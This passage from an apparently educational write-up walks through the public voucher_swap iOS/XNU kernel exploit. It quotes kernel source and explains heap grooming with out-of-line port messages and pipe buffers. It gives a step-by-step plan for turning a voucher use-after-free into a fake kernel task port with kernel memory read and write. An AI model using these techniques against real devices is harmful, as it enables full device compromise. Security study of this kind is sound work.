    <span class="mi">2679</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">MACH_MSG_PORT_DESCRIPTOR</span><span class="p">;</span>
    <span class="mi">2680</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">defined</span><span class="p">(</span><span class="n">KERNEL</span><span class="p">)</span>
    <span class="mi">2681</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">pad_end</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="mi">2682</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">2683</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* UseStaticTemplates */</span>
    <span class="mi">2684</span><span class="o">:</span> 
    <span class="mi">2685</span><span class="o">:</span> 
    <span class="mi">2686</span><span class="o">:</span> 	<span class="n">thr_act</span> <span class="o">=</span> <span class="n">convert_port_to_thread</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_request_port</span><span class="p">);</span>
    <span class="mi">2687</span><span class="o">:</span> 
    <span class="mi">2688</span><span class="o">:</span> 	<span class="n">RetCode</span> <span class="o">=</span> <span class="n">thread_get_mach_voucher</span><span class="p">(</span><span class="n">thr_act</span><span class="p">,</span> <span class="n">In0P</span><span class="o">-&gt;</span><span class="n">which</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">2689</span><span class="o">:</span> 	<span class="n">thread_deallocate</span><span class="p">(</span><span class="n">thr_act</span><span class="p">);</span>
    <span class="mi">2690</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">RetCode</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">2691</span><span class="o">:</span> 		<span class="n">MIG_RETURN_ERROR</span><span class="p">(</span><span class="n">OutP</span><span class="p">,</span> <span class="n">RetCode</span><span class="p">);</span>
    <span class="mi">2692</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">2693</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">__MigKernelSpecificCode</span>
    <span class="mi">2694</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* __MigKernelSpecificCode */</span>
    <span class="mi">2695</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_port_t</span><span class="p">)</span><span class="n">convert_voucher_to_port</span><span class="p">(</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">2696</span><span class="o">:</span> 
    <span class="mi">2697</span><span class="o">:</span> 
    <span class="mi">2698</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_bits</span> <span class="o">|=</span> <span class="n">MACH_MSGH_BITS_COMPLEX</span><span class="p">;</span>
    <span class="mi">2699</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_msg_size_t</span><span class="p">)(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">Reply</span><span class="p">));</span>
    <span class="mi">2700</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">msgh_body</span><span class="p">.</span><span class="n">msgh_descriptor_count</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="mi">2701</span><span class="o">:</span> 	<span class="n">__AfterRcvRpc</span><span class="p">(</span><span class="mi">3625</span><span class="p">,</span> <span class="s">"thread_get_mach_voucher"</span><span class="p">)</span>
    <span class="mi">2702</span><span class="o">:</span> <span class="p">}</span></code></pre></figure>

<p>Then there is the call to <strong>convert_voucher_to_port</strong> on Line 2695 which looks like this.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">492</span><span class="o">:</span> <span class="cm">/*
    493:  * Convert a voucher to a port.
    494:  */</span>
    <span class="mi">495</span><span class="o">:</span> <span class="n">ipc_port_t</span>
    <span class="mi">496</span><span class="o">:</span> <span class="n">convert_voucher_to_port</span><span class="p">(</span><span class="n">ipc_voucher_t</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">497</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">498</span><span class="o">:</span> 	<span class="n">ipc_port_t</span>	<span class="n">port</span><span class="p">,</span> <span class="n">send</span><span class="p">;</span>
    <span class="mi">499</span><span class="o">:</span> 
    <span class="mi">500</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IV_NULL</span> <span class="o">==</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">501</span><span class="o">:</span> 		<span class="k">return</span> <span class="p">(</span><span class="n">IP_NULL</span><span class="p">);</span>
    <span class="mi">502</span><span class="o">:</span> 
    <span class="mi">503</span><span class="o">:</span> 	<span class="n">assert</span><span class="p">(</span><span class="n">os_ref_get_count</span><span class="p">(</span><span class="o">&amp;</span><span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_refs</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
    <span class="mi">504</span><span class="o">:</span> 
    <span class="mi">505</span><span class="o">:</span> 	<span class="cm">/* create a port if needed */</span>
    <span class="mi">506</span><span class="o">:</span> 	<span class="n">port</span> <span class="o">=</span> <span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_port</span><span class="p">;</span>
    <span class="mi">507</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">IP_VALID</span><span class="p">(</span><span class="n">port</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">508</span><span class="o">:</span> 		<span class="n">port</span> <span class="o">=</span> <span class="n">ipc_port_alloc_kernel</span><span class="p">();</span>
    <span class="mi">509</span><span class="o">:</span> 		<span class="n">assert</span><span class="p">(</span><span class="n">IP_VALID</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
    <span class="mi">510</span><span class="o">:</span> 		<span class="n">ipc_kobject_set_atomically</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="p">(</span><span class="n">ipc_kobject_t</span><span class="p">)</span> <span class="n">voucher</span><span class="p">,</span> <span class="n">IKOT_VOUCHER</span><span class="p">);</span>
    <span class="mi">511</span><span class="o">:</span> 
    <span class="mi">512</span><span class="o">:</span> 		<span class="cm">/* If we lose the race, deallocate and pick up the other guy's port */</span>
    <span class="mi">513</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">OSCompareAndSwapPtr</span><span class="p">(</span><span class="n">IP_NULL</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_port</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">514</span><span class="o">:</span> 			<span class="n">ipc_port_dealloc_kernel</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">515</span><span class="o">:</span> 			<span class="n">port</span> <span class="o">=</span> <span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_port</span><span class="p">;</span>
    <span class="mi">516</span><span class="o">:</span> 			<span class="n">assert</span><span class="p">(</span><span class="n">ip_kotype</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">==</span> <span class="n">IKOT_VOUCHER</span><span class="p">);</span>
    <span class="mi">517</span><span class="o">:</span> 			<span class="n">assert</span><span class="p">(</span><span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_kobject</span> <span class="o">==</span> <span class="p">(</span><span class="n">ipc_kobject_t</span><span class="p">)</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">518</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">519</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">520</span><span class="o">:</span> 	</code></pre></figure>

<p>One of the first things which is checked on Line 503 is whether the voucher has a proper ref count. Then on line 507, the voucher’s port is being checked for validity. If it is not valid, a freshly new voucher port is allocated. This is great because while allocating a fake voucher in place of the freed voucher, if we somehow keep the <strong>iv_port</strong> pointer to be <strong>NULL</strong>, then we can actually also get a freshly allocated voucher port (<strong>IKOT_VOUCHER</strong>) for that particular voucher back to userspace, which we can then reference with <strong>ith_voucher-&gt;iv_port</strong>. This will allow us to further manipulate the voucher.</p>

<h3 id="heap-feng-shu-via-ool-ports-descriptor">Heap Feng Shu via OOL Ports Descriptor</h3>

<p>As discussed briefly in Part 1, complex Mach Messages have a descriptor field, which could be of four types.</p>

<ul>
  <li><strong>MACH_MSG_PORT_DESCRIPTOR</strong>: Sending a port in a message</li>
  <li><strong>MACH_MSG_OOL_DESCRIPTOR</strong>: Sending OOL data in a message</li>
  <li><strong>MACH_MSG_OOL_PORTS_DESCRIPTOR</strong>: Sending OOL ports array in a message</li>
  <li><strong>MACH_MSG_OOL_VOLATILE_DESCRIPTOR</strong>: Sending volatile data in a message</li>
</ul>

<p>When a Mach message is sent with <strong>MACH_MSG_OOL_PORTS_DESCRIPTOR</strong>, it calls the function <strong>ipc_kmsg_copyin_ool_ports_descriptor</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_kmsg</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">2799</span><span class="o">:</span> <span class="n">mach_msg_descriptor_t</span> <span class="o">*</span>
    <span class="mi">2800</span><span class="o">:</span> <span class="n">ipc_kmsg_copyin_ool_ports_descriptor</span><span class="p">(</span>
    <span class="mi">2801</span><span class="o">:</span> 	<span class="n">mach_msg_ool_ports_descriptor_t</span> <span class="o">*</span><span class="n">dsc</span><span class="p">,</span>
    <span class="mi">2802</span><span class="o">:</span> 	<span class="n">mach_msg_descriptor_t</span> <span class="o">*</span><span class="n">user_dsc</span><span class="p">,</span>
    <span class="mi">2803</span><span class="o">:</span> 	<span class="kt">int</span> <span class="n">is_64bit</span><span class="p">,</span>
    <span class="mi">2804</span><span class="o">:</span> 	<span class="n">vm_map_t</span> <span class="n">map</span><span class="p">,</span>
    <span class="mi">2805</span><span class="o">:</span> 	<span class="n">ipc_space_t</span> <span class="n">space</span><span class="p">,</span>
    <span class="mi">2806</span><span class="o">:</span> 	<span class="n">ipc_object_t</span> <span class="n">dest</span><span class="p">,</span>
    <span class="mi">2807</span><span class="o">:</span> 	<span class="n">ipc_kmsg_t</span> <span class="n">kmsg</span><span class="p">,</span>
    <span class="mi">2808</span><span class="o">:</span> 	<span class="n">mach_msg_option_t</span> <span class="o">*</span><span class="n">optionp</span><span class="p">,</span>
    <span class="mi">2809</span><span class="o">:</span> 	<span class="n">mach_msg_return_t</span> <span class="o">*</span><span class="n">mr</span><span class="p">)</span>
    <span class="mi">2810</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">2811</span><span class="o">:</span>     <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
    <span class="mi">2812</span><span class="o">:</span>     <span class="n">ipc_object_t</span> <span class="o">*</span><span class="n">objects</span><span class="p">;</span>
    <span class="mi">2813</span><span class="o">:</span>     <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="mi">2814</span><span class="o">:</span>     <span class="n">mach_vm_offset_t</span> <span class="n">addr</span><span class="p">;</span>
    <span class="mi">2865</span><span class="o">:</span>     <span class="k">if</span> <span class="p">(</span><span class="n">os_mul_overflow</span><span class="p">(</span><span class="n">count</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mach_port_t</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">ports_length</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">2866</span><span class="o">:</span>         <span class="o">*</span><span class="n">mr</span> <span class="o">=</span> <span class="n">MACH_SEND_TOO_LARGE</span><span class="p">;</span>
    <span class="mi">2867</span><span class="o">:</span>         <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="mi">2868</span><span class="o">:</span>     <span class="p">}</span>
    <span class="mi">2815</span><span class="o">:</span>     <span class="n">mach_msg_type_name_t</span> <span class="n">user_disp</span><span class="p">;</span>
    <span class="mi">2874</span><span class="o">:</span> 
    <span class="mi">2875</span><span class="o">:</span>     <span class="k">if</span> <span class="p">(</span><span class="n">ports_length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">2876</span><span class="o">:</span>         <span class="k">return</span> <span class="n">user_dsc</span><span class="p">;</span>
    <span class="mi">2877</span><span class="o">:</span>     <span class="p">}</span>
    <span class="mi">2878</span><span class="o">:</span> 
    <span class="mi">2879</span><span class="o">:</span>     <span class="n">data</span> <span class="o">=</span> <span class="n">kalloc</span><span class="p">(</span><span class="n">ports_length</span><span class="p">);</span>
    <span class="mi">2880</span><span class="o">:</span> 
    <span class="mi">2881</span><span class="o">:</span>     <span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">2882</span><span class="o">:</span>         <span class="o">*</span><span class="n">mr</span> <span class="o">=</span> <span class="n">MACH_SEND_NO_BUFFER</span><span class="p">;</span>
    <span class="mi">2883</span><span class="o">:</span>         <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="mi">2884</span><span class="o">:</span>     <span class="p">}</span>
    <span class="mi">2902</span><span class="o">:</span>     <span class="n">objects</span> <span class="o">=</span> <span class="p">(</span><span class="n">ipc_object_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span><span class="p">;</span>
    <span class="mi">2903</span><span class="o">:</span>     <span class="n">dsc</span><span class="o">-&gt;</span><span class="n">address</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
    <span class="mi">2904</span><span class="o">:</span> 
    <span class="mi">2905</span><span class="o">:</span>     <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">2906</span><span class="o">:</span>         <span class="n">mach_port_name_t</span> <span class="n">name</span> <span class="o">=</span> <span class="n">names</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="mi">2907</span><span class="o">:</span>         <span class="n">ipc_object_t</span> <span class="n">object</span><span class="p">;</span>
    <span class="mi">2908</span><span class="o">:</span> 
    <span class="mi">2909</span><span class="o">:</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">MACH_PORT_VALID</span><span class="p">(</span><span class="n">name</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">2910</span><span class="o">:</span>             <span class="n">objects</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ipc_object_t</span><span class="p">)</span><span class="n">CAST_MACH_NAME_TO_PORT</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
    <span class="mi">2911</span><span class="o">:</span>             <span class="k">continue</span><span class="p">;</span>
    <span class="mi">2912</span><span class="o">:</span>         <span class="p">}</span>
    <span class="mi">2913</span><span class="o">:</span> 
    <span class="mi">2914</span><span class="o">:</span>         <span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">ipc_object_copyin</span><span class="p">(</span><span class="n">space</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">user_disp</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">object</span><span class="p">);</span>
    <span class="mi">2915</span><span class="o">:</span> 
    <span class="mi">2916</span><span class="o">:</span>         <span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">2917</span><span class="o">:</span>             <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">j</span><span class="p">;</span>
    <span class="mi">2918</span><span class="o">:</span> 
    <span class="mi">2919</span><span class="o">:</span>             <span class="k">for</span><span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">i</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">2920</span><span class="o">:</span>                 <span class="n">object</span> <span class="o">=</span> <span class="n">objects</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
    <span class="mi">2921</span><span class="o">:</span>                 <span class="k">if</span> <span class="p">(</span><span class="n">IPC_OBJECT_VALID</span><span class="p">(</span><span class="n">object</span><span class="p">))</span>
    <span class="mi">2922</span><span class="o">:</span>                     <span class="n">ipc_object_destroy</span><span class="p">(</span><span class="n">object</span><span class="p">,</span> <span class="n">result_disp</span><span class="p">);</span>
    <span class="mi">2923</span><span class="o">:</span>             <span class="p">}</span>
    <span class="mi">2924</span><span class="o">:</span>             <span class="n">kfree</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">ports_length</span><span class="p">);</span>
    <span class="mi">2925</span><span class="o">:</span>             <span class="n">dsc</span><span class="o">-&gt;</span><span class="n">address</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="mi">2926</span><span class="o">:</span> 			<span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">optionp</span> <span class="o">&amp;</span> <span class="n">MACH_SEND_KERNEL</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">2927</span><span class="o">:</span> 				<span class="n">mach_port_guard_exception</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">kGUARD_EXC_SEND_INVALID_RIGHT</span><span class="p">);</span>
    <span class="mi">2928</span><span class="o">:</span> 			<span class="p">}</span>
    <span class="mi">2929</span><span class="o">:</span>             <span class="o">*</span><span class="n">mr</span> <span class="o">=</span> <span class="n">MACH_SEND_INVALID_RIGHT</span><span class="p">;</span>
    <span class="mi">2930</span><span class="o">:</span>             <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="mi">2931</span><span class="o">:</span>         <span class="p">}</span>
    <span class="mi">2932</span><span class="o">:</span> 
    <span class="mi">2933</span><span class="o">:</span>         <span class="k">if</span> <span class="p">((</span><span class="n">dsc</span><span class="o">-&gt;</span><span class="n">disposition</span> <span class="o">==</span> <span class="n">MACH_MSG_TYPE_PORT_RECEIVE</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
    <span class="mi">2934</span><span class="o">:</span>                 <span class="n">ipc_port_check_circularity</span><span class="p">(</span>
    <span class="mi">2935</span><span class="o">:</span>                     <span class="p">(</span><span class="n">ipc_port_t</span><span class="p">)</span> <span class="n">object</span><span class="p">,</span>
    <span class="mi">2936</span><span class="o">:</span>                     <span class="p">(</span><span class="n">ipc_port_t</span><span class="p">)</span> <span class="n">dest</span><span class="p">))</span>
    <span class="mi">2937</span><span class="o">:</span>             <span class="n">kmsg</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="o">-&gt;</span><span class="n">msgh_bits</span> <span class="o">|=</span> <span class="n">MACH_MSGH_BITS_CIRCULAR</span><span class="p">;</span>
    <span class="mi">2938</span><span class="o">:</span> 
    <span class="mi">2939</span><span class="o">:</span>         <span class="n">objects</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">object</span><span class="p">;</span>
    <span class="mi">2940</span><span class="o">:</span>     <span class="p">}</span>
    <span class="mi">2941</span><span class="o">:</span> 
    <span class="mi">2942</span><span class="o">:</span>     <span class="k">return</span> <span class="n">user_dsc</span><span class="p">;</span>
    <span class="mi">2943</span><span class="o">:</span> <span class="p">}</span></code></pre></figure>

<p>On Line 2879, it calls kalloc to allocate memory in the heap in the kalloc zone and in line 2902, it is substituted as a variable <strong>objects</strong> which is an array of port pointers. On line 2909, each port is iterated in the descriptor and checked for validity. The function <strong>CAST_MACH_NAME_TO_PORT</strong> is called on the port which basically does this. If the port is <strong>MACH_PORT_DEAD</strong>, its filled with <strong>0xFFFFFFFFFFFFFFFF</strong>, and if its <strong>MACH_PORT_NULL</strong>, its filled with <strong>0x0000000000000000</strong>.</p>

<p>So basically, by sending a lot of Mach messages with OOL Port Descriptor, it is possible to allocate the kalloc zone with valid pointers, <strong>0xFFFFFFFFFFFFFFFF</strong> or <strong>0x0000000000000000</strong>. The same memory can be deallocated by receiving the message, and thereby poking holes within the memory. The contents of the received messages will be the ports and they can be analyzed for certain pattern to find overlaps. This technique has been used extensively in previous exploits for performing Heap Feng Shui.</p>

<p>The idea is to send Port pointers in a pattern such that <strong>iv_refs</strong> is overlapped with lower 32 bits of base port address (Little-Endian system) and its still not more than its max value. Sending base port address at a certain index in the pattern will overlap <strong>iv_refs</strong> with lower 32 bits and the next field with the upper 32 bits. Hence, incrementing iv_refs will basically increment the base port pointer.</p>

<p><img src="/images/voucher.png" alt="Pid" /></p>

<p>Similarly, overlapping <strong>iv_port</strong> with <strong>MACH_PORT_NULL</strong> will be just fine since we can call <strong>thread_get_mach_voucher</strong> to get a new voucher port that can use to manipulate the reference count again.</p>

<p>In order to allocate the freed voucher with Port pointers, it is essential to initiate zone garbage collection on the <strong>ipc vouchers</strong> zone. This can be done by allocating a large number of vouchers and then freeing them, essentially making that memory to be used again, the minimum size for which is 1 page, and then spraying the memory with port pointers as described above.</p>

<h3 id="pipe-buffers">Pipe Buffers</h3>

<p>Pipe is another system call in <strong>xnu</strong> used for IPC. It creates a pipe that allocates a pair of file descriptors and allows unidirectional data flow. The buffer through which the data flows is known as the <strong>pipe buffer</strong>. Data written to the write end of the pipe buffer can be read from the read end of the buffer, but not vice versa as this feature is not provided by <strong>xnu</strong>. This basically allows you to read and write into the same address space. The other important thing is that it occupies kva (kernel virtual address) space and hence is a useful primitive for allocating memory in the heap. Another important thing to note is that the pipe buffer size is set to a max value of <strong>16384</strong> bytes by default, and the whole pipe size for all the pipe buffers is set to <strong>16MB</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">bsd</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">pipe</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">68</span><span class="o">:</span> 
    <span class="mi">69</span><span class="o">:</span> <span class="cm">/*
    70:  * Pipe buffer size, keep moderate in value, pipes take kva space.
    71:  */</span>
    <span class="mi">72</span><span class="o">:</span> <span class="err">#</span><span class="n">ifndef</span> <span class="n">PIPE_SIZE</span>
    <span class="mi">73</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">PIPE_SIZE</span>	<span class="mi">16384</span>
    <span class="mi">74</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">75</span><span class="o">:</span> 
    <span class="mi">76</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">PIPE_KVAMAX</span>	<span class="p">(</span><span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">16</span><span class="p">)</span>
    <span class="mi">77</span><span class="o">:</span> 
    <span class="mi">78</span><span class="o">:</span> <span class="err">#</span><span class="n">ifndef</span> <span class="n">BIG_PIPE_SIZE</span>
    <span class="mi">79</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">BIG_PIPE_SIZE</span>	<span class="p">(</span><span class="mi">64</span><span class="o">*</span><span class="mi">1024</span><span class="p">)</span>
    <span class="mi">80</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">81</span><span class="o">:</span> 
    <span class="mi">82</span><span class="o">:</span> <span class="err">#</span><span class="n">ifndef</span> <span class="n">SMALL_PIPE_SIZE</span>
    <span class="mi">83</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">SMALL_PIPE_SIZE</span>	<span class="n">PAGE_SIZE</span>
    <span class="mi">84</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">85</span><span class="o">:</span> </code></pre></figure>

<p>If the data has been written to the pipe buffer and its full, then the pipe is considered to be blocked. To free that buffer, data must be read out from the pipe buffer. Data can be sprayed using pipe buffers by allocating many pipe buffers and writing data to it. The total number of pipes that can be created is the total pipe size (16 MB) divided by the pipe buffer size (16384 bytes), which is 1024.</p>

<p>The advantage of pipe buffers is that if we are able to get a pointer to one of our pipe buffers and read the value of it, we can basically identify which of those 1024 pipe buffers it is , and then reallocate data in that particular pipe buffer for our benefit.</p>

<p>What we are trying to achieve in this case for the <strong>voucher_swap</strong> exploit is getting a port pointer to point to one of the pipe buffers, identify which pipe buffer it is, and then reallocating data in that pipe buffer to create a <strong>fake port</strong>, which can allow us to do certain tasks. Since the Port pointer originally points to a port, if it is possible to somehow increment that port pointer to point to the pipe buffers, that will also work. Hence, you need to spray some ports first such that the <strong>ipc.ports</strong> zone for the ports grows and fresh pages are allocated from the zone map, then spray the pipe buffers such that the pipe buffers land just in front of the sprayed ports, and then manipulate the port pointer which pointed to one of the sprayed ports incrementally so that it lands into the pipe buffers. In this case, we will use the <strong>iv_refs</strong> field to point to a port pointer, and then use the vulnerability to leak references thereby increasing it (iv_refs) and pointing it to the pipe buffers.</p>

<p>Now once you receive the messages that you sent for the spray you get <strong>ipc_port</strong> and send rights to it. However, in this case one of the <strong>ipc_port</strong> pointer actually points to our pipe buffers. Now we can manipulate that port contents using the read and write functionality of pipe buffers.</p>

<p>So our exploitation steps should look like this.</p>

<ol>
  <li>Create the thread for which the voucher pointers will be kept</li>
  <li>Spray the Heap with Ports so that the <strong>ipc.ports</strong> zone will grow and allocate fresh pages from the zone map. Set the last port as the <strong>base_port</strong>.</li>
  <li>Spray the Pipe buffers and since the memory is freshly allocated, the pipe buffer will land just in front of the ports, since the memory will now be allocated incrementally. The pipe buffers content masks that of a port and each pipe buffers port content has a different <strong>IKOT</strong> type to identify later which pipe buffer overlaps.</li>
  <li>Spray the Vouchers and choose one Voucher to be freed. These vouchers will land in their own zone <strong>ipc vouchers</strong></li>
  <li>Store a Pointer to the selected voucher that was created in the previous step in the threads <strong>ith_voucher</strong> field. This will increase its reference count. Now use the vulnerability to reduce the reference count by one again, while still holding a pointer to the voucher</li>
  <li>Release the vouchers</li>
  <li>Spray using OOL Ports Descriptor by sending mach messages in a pattern (triggering GC) such that <strong>iv_refs</strong> is overlapped with the base port’s lower 32 bits and the <strong>iv_port</strong> will be <strong>MACH_PORT_NULL</strong>. Incrementing <strong>iv_refs</strong> will basically cross base port and land into the pipe buffers.</li>
  <li>Get a new voucher port by calling <strong>thread_get_mach_voucher</strong>. Now we can manipulate the overlapping freed voucher.</li>
  <li>Use reference counting bug to increase the <strong>iv_refs</strong> and point it to the pipe buffers</li>
  <li>Receive the message that was sent using OOL ports descriptor. Look at the ports that were received and find the overlapping pipe buffer by looking at the contents of the port.</li>
  <li>Since we can read and write into pipe buffers we can create a fake port in the pipe buffer.</li>
  <li>Create a fake <strong>IKOT_TASK</strong> port and read memory using <strong>pid_for_task</strong> 4 bytes at a time.</li>
  <li>Create a fake Kernel Task Port by copying <strong>ipc_space_kernel</strong> and kernels <strong>vm_map</strong> using the read primitives and writing them into the pipe buffers.</li>
  <li>Create a better fake Kernel Task Port using <strong>mach_vm_allocate</strong></li>
  <li>Read and Write Kernel Memory!</li>
</ol>

<p>Anyways, enough of background, let’s jump into the exploitation in detail.</p>

<h3 id="the-exploit">The Exploit</h3>

<p>If you haven’t downloaded it yet, get a copy of the <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1731#c10">voucher_swap</a> exploit code so you can follow along. In some cases, the comments are self explanatory so i am just gonna skip the explanation.</p>

<h4 id="step-1-create-a-separate-thread-for-the-voucher">Step 1: Create a Separate thread for the Voucher</h4>

<p>Create a separate thread where we will store the pointer to the voucher. The thread has an <strong>ith_voucher</strong> field where we can keep the reference to the voucher.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 1\. Create the thread whose ith_voucher field we will use during the exploit. This could</span>
    	<span class="c1">// be the current thread, but that causes a panic if we try to perform logging while not</span>
    	<span class="c1">// being run under a debugger, since write() will trigger an access to ith_voucher. To</span>
    	<span class="c1">// avoid this, we create a separate thread whose ith_voucher field we can control. In order</span>
    	<span class="c1">// for thread_set_mach_voucher() to work, we need to be sure not to start the thread.</span>
    	<span class="n">kr</span> <span class="o">=</span> <span class="n">thread_create</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="o">&amp;</span><span class="kr">thread</span><span class="p">);</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">kr</span> <span class="o">==</span> <span class="n">KERN_SUCCESS</span><span class="p">);</span></code></pre></figure>

<h4 id="step-2-create-pipes-for-the-spray">Step 2: Create Pipes for the spray</h4>

